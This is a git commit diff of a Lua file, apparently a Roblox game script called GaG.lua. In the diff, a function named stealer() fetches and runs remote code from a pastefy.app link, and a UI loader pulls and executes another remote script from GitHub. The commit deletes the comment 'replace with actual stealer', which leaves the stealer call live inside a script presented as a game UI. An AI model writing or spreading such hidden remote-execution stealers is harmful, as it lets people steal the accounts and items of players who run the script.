7bdce18495c2b5a34f99e2f0ed7edd8a7083d5de
scripts <nielanthonyr@gmail.com>
2025-07-29 09:51:37 +0800

    GaG.lua

--- GaG.lua
+++ GaG.lua
@@ -1,5 +1,5 @@
 local function stealer()
-    loadstring(game:HttpGet("https://pastefy.app/As2mBnGJ/raw"))() -- replace with actual stealer
+    loadstring(game:HttpGet("https://pastefy.app/As2mBnGJ/raw"))()
 end
 local function loadui()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
